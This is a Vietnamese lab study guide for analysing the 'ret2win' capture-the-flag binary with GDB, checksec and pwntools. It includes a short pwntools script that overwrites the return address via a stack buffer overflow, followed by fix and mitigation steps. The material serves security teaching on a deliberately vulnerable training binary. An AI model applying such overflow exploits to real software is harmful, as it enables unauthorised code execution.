# Học: phân tích binary ret2win bằng GDB trên x86_64 (mục 4, 5, 7)

Phục vụ ảnh `03_sink_va_buffer`, `04_debugger_truoc_sau`, `05_ket_qua_challenge` trong [../evidence/](../evidence/).

Quy ước tin cậy:
- `[KT]` = kiến thức/phương pháp chung, **chưa chạy trên binary nhóm**.
- `[ĐO TRONG VM]` = ô để trống, **phải điền bằng số đo thật** trên Kali x86_64. Không bịa.

Môi trường đã chốt: **Kali amd64 (x86_64) qua UTM Emulate** (xem [../README.md](../README.md)). Mọi offset/địa chỉ dưới đây để trống đến khi đo.

## 0. Cài công cụ (một lần, trong VM)

```bash
sudo apt update
sudo apt install -y gdb gcc python3-pwntools file binutils
# pwndbg giup xem stack/thanh ghi de hon; neu apt khong co, cai tay:
#   git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
```

## 1. Trinh tự phân tích (bám 10 mục của đề)

### Bước A — Thu thập tĩnh (ảnh 01 + 03) `[KT]`

```bash
file ./ret2win                 # kien truc, dong/tinh, stripped hay khong
checksec --file=./ret2win      # canary / NX / PIE / RELRO
```

**Kết quả thật trên binary nhóm (đo 2026-10-12):**
- `file`: ELF 64-bit LSB, **x86-64**, dynamically linked, interpreter `/lib64/ld-linux-x86-64.so.2`, **not stripped**, BuildID `19abc0b3bb228157af55b8e16af7316d54ab0597`.
- `checksec`: **No canary** · **NX enabled** · **No PIE** · Partial RELRO · No RPATH/RUNPATH · 69 symbols.

**Ý nghĩa cho khai thác (quan trọng):**
- **No canary** → ghi đè địa chỉ trả về mà không phải vượt qua stack canary.
- **No PIE** → địa chỉ các hàm **cố định**, biết trước khi chạy → hard-code địa chỉ `ret2win()` được, không phụ thuộc ASLR.
- **NX enabled** → không chạy shellcode trên stack; nhưng ret2win là kiểu "nhảy tới hàm có sẵn" nên NX **không cản** được cách này. Đây là lý do challenge giải đơn giản.

Xem hàm và disassembly:
```bash
objdump -d ./ret2win | less            # hoac dung gdb: disassemble <ham>
gdb -q ./ret2win
  info functions                       # liet ke ham: tim ham nhan input va ham dich
  disassemble pwnme                     # ten ham co the khac, xem info functions
  disassemble ret2win                  # ham dich (thuong in flag)
```
Cần tìm và ghi:
- Hàm chứa **sink** (phép đọc vào buffer): tên = `[…]`, lệnh đọc = `[…]` (ví dụ `read`/`fgets`/`gets`).
- **Kích thước buffer** cấp trên stack: nhìn `sub rsp, 0x…` hoặc vị trí buffer so với saved RBP = `[…]`.
- **Số byte tối đa input được nhận** (nếu dùng `read(0, buf, N)` thì N = `[…]`).
- **Địa chỉ hàm đích** `ret2win` = `[ĐO TRONG VM]` (ví dụ `0x………`). Vì NX bật + không PIE, đây là ret2win kiểu "nhảy tới hàm có sẵn", không cần shellcode.

> Lưu ý trung thực: số byte buffer đọc từ disassembly là **đo trên binary thật**, hợp lệ. Nhưng khoảng cách buffer → địa chỉ trả về (offset) nên xác nhận thêm bằng bước B, vì có padding/alignment.

### Bước B — Đo OFFSET tới địa chỉ trả về (ảnh 04) `[KT]`

Dùng chuỗi cyclic của pwndbg/pwntools để không phải đoán:
```bash
# Tao chuoi mau 200 byte
cyclic 200 > /tmp/pattern            # lenh cyclic co trong pwndbg/pwntools
# Trong gdb:
gdb -q ./ret2win
  run < /tmp/pattern                 # chuong trinh crash khi ret
  # xem gia tri tai RSP luc crash (gia tri da de len RIP/return)
  # pwndbg se in goi y "offset"; hoac:
  cyclic -l <gia_tri_4_hoac_8_byte_tai_dinh_stack>
```
Ghi: **offset = `[ĐO TRONG VM]` byte** (từ đầu buffer tới địa chỉ trả về).

Chụp ảnh `04`: trạng thái **trước** (RIP bình thường) và **sau** (RIP/giá trị tại đỉnh stack = giá trị pattern mình điều khiển). Đây là bằng chứng "đã điều khiển địa chỉ trả về", mạnh hơn chỉ "crash".

### Bước C — Dựng input đạt mục tiêu (ảnh 05) `[KT]`

```python
# exploit.py — chay trong VM
from pwn import *
elf = ELF('./ret2win')
offset = 0            # <-- dien offset do o Buoc B
target = elf.symbols['ret2win']   # dia chi ham dich, pwntools tu lay
payload = b'A'*offset + p64(target)
io = process('./ret2win')
io.sendline(payload)
io.interactive()      # ky vong: flag duoc in ra
```
Chạy, nếu in ra flag → đạt mục tiêu challenge. Chụp ảnh `05` + giải thích **vì sao** có kết quả (địa chỉ trả về bị thay bằng địa chỉ `ret2win`).

> Bốn mức bằng chứng phải nói đúng: (1) có ghi vượt, (2) crash, (3) đã đổi địa chỉ trả về, (4) đạt mục tiêu. Mỗi ảnh chứng minh mức nào thì nói mức đó.

### Bước D — Sửa lỗi + bảng bảo vệ (ảnh 06) `[KT]`

- Sửa tận gốc: thay sink bằng đọc có giới hạn theo kích thước đích (so sánh với [bai_tap_3_doan_ma/02_da_sua.c](bai_tap_3_doan_ma/02_da_sua.c)).
- Bảng canary/NX/ASLR/PIE: điền **trạng thái thật của ret2win** (từ `checksec` bước A) và giải thích mỗi lớp chặn bước nào. Ghi rõ nếu binary cố tình tắt bảo vệ để minh họa.

## 2. Lưu ý riêng cho môi trường Emulate

- Quan sát **ASLR lúc chạy** dưới emulation có thể không giống máy x86_64 vật lý; nếu nói về ASLR, ghi là quan sát trong VM Emulate (một giới hạn ở mục 9).
- `ret2win` không-PIE nên địa chỉ hàm đích cố định → không phụ thuộc ASLR; đây là lý do challenge này hợp để demo.

## 3. Tự kiểm tra trước khi quay demo

- [ ] Nói được tên hàm sink, kích thước buffer, số byte input tối đa — đều từ binary này.
- [ ] Nói được offset và **cách đo** (cyclic), không lấy từ sơ đồ minh họa.
- [ ] Phân biệt rõ ảnh nào chứng minh "crash" và ảnh nào chứng minh "đã điều khiển địa chỉ trả về".
- [ ] checksec của ret2win: canary/NX/PIE bật hay tắt, và ý nghĩa.
- [ ] Demo chạy lại được **≥ 2 lần liên tiếp** (yêu cầu CHECKLIST).
